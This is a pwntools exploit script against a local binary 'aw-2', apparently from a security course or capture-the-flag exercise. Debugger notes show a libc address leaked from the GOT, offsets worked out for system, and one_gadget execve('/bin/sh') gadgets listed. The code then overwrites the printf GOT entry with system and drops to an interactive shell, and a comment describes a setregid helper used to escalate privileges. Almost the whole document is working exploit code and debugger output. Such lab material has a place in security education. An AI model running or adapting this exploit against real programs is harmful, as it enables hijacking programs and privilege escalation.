#!/usr/bin/env python

from pwn import *

"""
pwndbg> x/10x 0x602028
0x602028:       0x00400716      0x00000000      0x00400726      0x00000000
0x602038:       0x06c02740      0x00007f84      0x00400746      0x00000000
0x602048:       0x06ce9c50      0x00007f84

arb read first 8 bytes of 0x602038 to get:
    0x7f8406c02740 <__libc_start_main>

now we need to find printf & system:
    pwndbg> print printf
    $2 = {<text variable, no debug info>} 0x7f8406c37800 <__printf>
    pwndbg> print system
    $3 = {<text variable, no debug info>} 0x7f8406c27390 <__libc_system>

system = libc_start_main + 0x24c50
printf = libc_start_main + 0x350c0

now arb write
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
    rax == NULL

    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
    [rsp+0x30] == NULL

    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
    [rsp+0x50] == NULL

    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL


also from info func in gdb:
    0x0000000000400710 printf@plt

so we can just put the one_gadget at that location...
"""

# first, set PATH to $PATH:~/week6/3-aw-2/
# also, create a program to setregid(..); system("/bin/sh"); called "Writing"


p = process("./aw-2")

p.recv()
p.sendline("8")

p.recv()
p.sendline("0x602038")
data = p.recv()
data = data.split()
data = data[5]
data = data[:-4]

libc_main = u64(data)
libc_system = libc_main + 0x24c50

p.sendline("8")
print(p.recv())
p.sendline("0x602028")
p.sendline(p64(libc_system))

p.interactive()
